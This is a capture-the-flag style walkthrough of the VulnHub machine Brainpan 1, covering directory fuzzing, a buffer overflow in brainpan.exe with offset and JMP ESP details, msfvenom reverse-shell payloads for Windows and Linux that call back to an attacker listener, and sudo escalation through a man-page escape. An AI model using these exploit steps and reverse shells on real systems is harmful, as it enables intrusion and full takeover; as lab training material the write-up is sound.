# Table of contents

- [Recon](#recon)
  - [TCP/9999](#tcp9999)
  - [TCP/10000 - HTTP](#tcp10000---http)
    - [FFUF](#ffuf)
- [Initial Foothold](#initial-foothold)
  - [TCP/10000 - HTTP - BOF Binary](#tcp10000---http---bof-binary)
  - [BOF](#bof)
- [TCP/9999 - BOF](#tcp9999---bof)
- [Privilege Escalation](#privilege-escalation)
  - [Root - Via Sudo (GTFO Bin)](#root---via-sudo-gtfo-bin)

# Recon
## TCP/9999
- BOF executable running

## TCP/10000 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/brainpan-1]
└─# ffuf -u http://$ip:10000/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.9:10000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 215, Words: 7, Lines: 9]
bin                     [Status: 301, Size: 0, Words: 1, Lines: 1]
index.html              [Status: 200, Size: 215, Words: 7, Lines: 9]
:: Progress: [4615/4615] :: Job [1/1] :: 6768 req/sec :: Duration: [0:00:30] :: Errors: 15 ::

```
- `bin`
	- contains the BOF executable


# Initial Foothold
## TCP/10000 - HTTP - BOF Binary
1. Proceed to `/bin` to download the BOF binary
	```
	┌──(root💀kali)-[~/vulnHub/brainpan-1/192.168.110.9/exploit]
	└─# wget http://192.168.110.9:10000/bin/brainpan.exe -q

	```
2. Transfer it to Windows machine to create a payload.

## BOF
1. Determine min buffer size till EIP overflows with A
	- Program crashed at 600As
	![](images/Pasted%20image%2020220203025439.png)
	- EIP is filled with As.
1. Determine EIP 
	- via msf-pattern_create
		```
		┌──(root💀kali)-[~/vulnHub/brainpan-1/192.168.110.9/exploit]
		└─# msf-pattern_create -l 600
			Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
		```
		![](images/Pasted%20image%2020220203025959.png)
	- Pattern Address: `35724134`
3. Determine EIP offset
	- via msf-pattern_offset
		```
		┌──(root💀kali)-[~/vulnHub/brainpan-1/192.168.110.9/exploit]
		└─# msf-pattern_offset -q 35724134
		[*] Exact match at offset 524
		```
	- or via mona
		```
		!mona findmsp -distance 600
		```
		![](images/Pasted%20image%2020220203030304.png)
	- EIP offset: 524
4. Test with Bs 
	```
	buffer = b"A" * 524 + b"B" * 4
	```
	- Make sure `42424242` is at EIP
	![](images/Pasted%20image%2020220203030449.png)
5. Determine badchars
	- badChars: `\x00`
		![](images/Pasted%20image%2020220203030945.png)
		- badChars: `\x00`
6. Determine JMP
	- Module must not have any protection settings `False: Rebase, SafeSEH, ASLR, NXCompact, OS DLL`
	- Pick a module that belongs to to the bufferoverflow.exe
	- JMP Addr must not have any of the identified badChars
		```
		# Method 1:
		!mona jmp -r esp 
		!mona jmp -r esp -cpb "badChars"
		
		# Method 2: 
		1. !mona modules 
		2. Pick a module that belongs to the bufferoverflow.exe 
		3. !mona find -s "xff\xef" -m <module name>, (etc; essfunc.dll)
		4. Pick a return addr (Must not contain any badChars)
		
		# Method 3: 
		Top-Left box ->  Right-Click -> Search For -> All commands in all modules -> Type JMP ESP
		```
		![](images/Pasted%20image%2020220203031509.png)
	- Return Address: `0x311712f3` - brainpan.exe
	- Little Endian: `\xf3\x12\x17\x31`
	- Make sure EIP points to the selected JMP Address
		- Check `bp 0x311712f3`
		![](images/Pasted%20image%2020220203031720.png)
		- Points to `brainpan.exe`
7. Generate Shellcode
	```
	msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.108 LPORT=4444 EXITFUNC=thread -b '\x00' -f python
	```
8. Exploit
	1. offset (the number of As to reach EIP)
	2. returnAdd (EIP)
	3. NOP
	4. Shellcode
	```
	buffer = b"A" * 524 + b"\xf3\x12\x17\x31" + NOP + buf
	```
	![](images/Pasted%20image%2020220203033936.png)
	- Obtained shell on Windows Machine

# TCP/9999 - BOF
1. Generate the payload again
	```
	msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.110.4 LPORT=4444 EXITFUNC=thread -b '\x00' -f python
	```
2. Change IP address in `exploit.py`
3. Exploit
	![](images/Pasted%20image%2020220203034523.png)
4. Obtained shell, but the machine is Linux
	![](images/Pasted%20image%2020220203034604.png)
5. Switch payload to linux
	```
	msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=192.168.110.4 LPORT=4444 EXITFUNC=thread -b '\x00' -f python
	```
6. Restart Machine & Exploit
	![](images/Pasted%20image%2020220203034933.png)

# Privilege Escalation
## Root - Via Sudo (GTFO Bin)
1. Check sudo access
	```
	puck@brainpan:/$ sudo -l
	Matching Defaults entries for puck on this host:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User puck may run the following commands on this host:
		(root) NOPASSWD: /home/anansi/bin/anansi_util
	puck@brainpan:/$ 
	```
2. Execute `/home/anansi/bin/anansi_util`, to see what it does
	```
	puck@brainpan:/$ sudo /home/anansi/bin/anansi_util 
	Usage: /home/anansi/bin/anansi_util [action]
	Where [action] is one of:
	  - network
	  - proclist
	  - manual [command]
	puck@brainpan:/$ 
	```
	- `manual`, has a [GTFOBins](https://gtfobins.github.io/gtfobins/man/#sudo) entry
3. Exploit
	```
	puck@brainpan:/$ sudo /home/anansi/bin/anansi_util manual man
	#!/bin/sh
	```
	![](images/Pasted%20image%2020220203035435.png)
4. Obtain Root Flag
	```
		# cat b.txt
	_|                            _|                                        
	_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
	_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
	_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
	_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
												_|                          
												_|


												  http://www.techorganic.com 
	```




---
Tags: #bof/linux-bof #linux-priv-esc/sudo/gtfo-bin 

--- 
